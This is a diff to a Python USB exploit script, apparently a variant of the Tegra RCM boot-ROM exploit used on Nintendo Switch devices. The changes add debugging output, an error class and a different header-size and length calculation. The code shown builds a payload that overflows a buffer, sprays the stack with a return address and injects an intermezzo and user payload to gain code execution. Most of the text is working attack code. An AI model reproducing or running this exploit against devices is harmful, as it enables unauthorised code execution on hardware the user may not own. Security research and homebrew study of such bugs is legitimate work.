@@ -33,6 +33,10 @@ import errno
 import ctypes
 import argparse
 import platform
+import binascii
+
+RCM_HEADER_SIZE = 680
+# RCM_HEADER_SIZE = 644
 
 # The address where the RCM payload is placed.
 # This is fixed for most device.
@@ -41,7 +45,7 @@ RCM_PAYLOAD_ADDR    = 0x40010000
 # The address where the user payload is expected to begin.
 PAYLOAD_START_ADDR  = 0x40010E40
 
-# Specify the range of addresses where we should inject oct
+# Specify the range of addresses where we should inject our
 # payload address.
 STACK_SPRAY_START   = 0x40014E40
 STACK_SPRAY_END     = 0x40017000
@@ -50,6 +54,12 @@ STACK_SPRAY_END     = 0x40017000
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
 # GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
 # GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>
+
+class RCMError(Exception):
+    def __init__(self, rcm_error_code):
+        msg = "RCM error 0x{:08x}".format(rcm_error_code)
+        super().__init__(msg)
+        self.rcm_error_code = rcm_error_code
 
 class HaxBackend:
     """
@@ -130,6 +140,8 @@ class HaxBackend:
     def find_device(self, vid=None, pid=None):
         """ Set and return the device to be used """
 
+        # os.environ['PYUSB_DEBUG'] = 'debug'
+        os.environ['PYUSB_DEBUG'] = 'info'
         import usb
 
         self.dev = usb.core.find(idVendor=vid, idProduct=pid)
@@ -504,15 +516,20 @@ class RCMHax:
         """ Writes data to the main RCM protocol endpoint. """
 
         length = len(data)
+        print("txing {} bytes total".format(length))
         packet_size = 0x1000
+        # packet_size = 512
+        length_sent = 0
 
         while length:
             data_to_transmit = min(length, packet_size)
+            print("txing {} bytes ({} already sent)".format(data_to_transmit, length_sent))
             length -= data_to_transmit
 
             chunk = data[:data_to_transmit]
             data  = data[data_to_transmit:]
             self.write_single_buffer(chunk)
+            length_sent += data_to_transmit
 
 
     def write_single_buffer(self, data):
@@ -522,8 +539,15 @@ class RCMHax:
         If it's not, send a ZLP.
         """
         self._toggle_buffer()
-        return self.backend.write_single_buffer(data)
-
+        try:
+            return self.backend.write_single_buffer(data)
+        except Exception as err:
+            print("USBError: {}".format(err))
+            rcm_err = self.read(4)
+            # print("RCM error buf: {}".format(rcm_err))
+            rcm_err_int = ctypes.c_uint32.from_buffer_copy(rcm_err).value
+            # print("RCM error buf: 0x{:08x}".format(rcm_err_int))
+            raise RCMError(rcm_err_int)
 
     def _toggle_buffer(self):
         """
@@ -556,6 +580,8 @@ class RCMHax:
         # Determine how much we'd need to transmit to smash the full stack.
         if length is None:
             length = self.STACK_END - self.get_current_buffer_address()
+
+        print("sending status request with length {}".format(length))
 
         return self.backend.trigger_vulnerability(length)
 
@@ -599,7 +625,7 @@ except IOError as e:
 # Print the device's ID. Note that reading the device's ID is necessary to get it into
 try:
     device_id = switch.read_device_id()
-    print("Found a Tegra with Device ID: {}".format(device_id))
+    print("Found a Tegra with Device ID: {}".format(binascii.hexlify(device_id)))
 except OSError as e:
     # Raise the exception only if we're not being permissive about ID reads.
     if not arguments.permissive_id:
@@ -611,15 +637,21 @@ except OSError as e:
 
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
-length  = 0x30298
+# length  = 0x30298
+length  = 0x30000 + RCM_HEADER_SIZE - 0x10
+# length  = 0x0001f814
 payload = length.to_bytes(4, byteorder='little')
+print("Setting rcm msg size to 0x{:08x}".format(length))
+print("RCM payload (len_insecure): {}".format(payload.hex()))
 
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
+# pad out to RCM_HEADER_SIZE so the payload starts at the right address in IRAM
+payload += b'\0' * (RCM_HEADER_SIZE - len(payload))
 
 # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
 print("\nSetting ourselves up to smash the stack...")
+
+print("Payload offset of intermezzo: 0x{:08x}".format(len(payload)))
 
 # Include the Intermezzo binary in the command stream. This is our first-stage
 # payload, and it's responsible for relocating the final payload to 0x40010000.
@@ -629,6 +661,7 @@ with open(intermezzo_path, "rb") as f:
     intermezzo_size = len(intermezzo)
     payload        += intermezzo
 
+print("Payload offset of padding before user payload: 0x{:08x}".format(len(payload)))
 
 # Pad the payload till the start of the user payload.
 padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
@@ -640,22 +673,32 @@ target_payload = b''
 with open(payload_path, "rb") as f:
     target_payload = f.read()
 
+print("Payload offset of user payload first part: 0x{:08x}".format(len(payload)))
+
 # Fit a collection of the payload before the stack spray...
 padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
 payload += target_payload[:padding_size]
+
+print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
 # ... insert the stack spray...
 repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
+print("Payload offset user payload second part 0x{:08x}".format(len(payload)))
+
 # ... and follow the stack spray with the remainder of the payload.
 payload += target_payload[padding_size:]
+
+print("Payload offset of remaining RCM padding 0x{:08x}".format(len(payload)))
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
 payload_length = len(payload)
 padding_size   = 0x1000 - (payload_length % 0x1000)
 payload += (b'\0' * padding_size)
+
+print("Payload offset of end of payload 0x{:08x}".format(len(payload)))
 
 # Check to see if our payload packet will fit inside the RCM high buffer.
 # If it won't, error out.
